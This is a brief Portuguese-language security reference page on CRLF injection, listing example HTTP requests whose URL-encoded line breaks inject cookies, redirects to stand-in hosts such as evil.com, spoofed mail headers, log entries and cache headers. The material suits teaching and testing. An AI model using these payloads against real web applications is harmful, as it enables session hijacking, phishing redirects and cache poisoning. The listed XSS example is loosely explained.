---
description: Carriage Return Line Feed
---

# CRLF

CRLF é uma vulnerabilidade que explora quebras de linha para injetar cabeçalhos HTTP maliciosos.

Exemplos:\
\
Injeção de cabeçalho \
GET /index.php?lang=en%0D%0ASet-Cookie:%20admin=true HTTP/1.1\
\
Redirecionamento \
GET /?q=test%0D%0ALocation:%20http://malicioso.com HTTP/1.1\
\
Manipulação do corpo da resposta\
GET /?input=hello%0D%0AContent-Length:%200 HTTP/1.1\
\
Injeção XSS\
GET /search?q=abc%0D%0Aalert(1) HTTP/1.1\
\
Log Poisoning\
GET /login?user=admin%0D%0AERROR:%20User%20not%20found HTTP/1.1\
\
Bypass filtros\
GET /page?url=http://site.com%0D%0ALocation:%20http://evil.com HTTP/1.1<br>

Header Injection\
GET /email?subject=Hi%0D%0AFrom:%20attacker@evil.com HTTP/1.1\
\
Cache poisoning\
GET /page?lang=en%0D%0ACache-Control:%20public,%20max-age=999999 HTTP/1.1
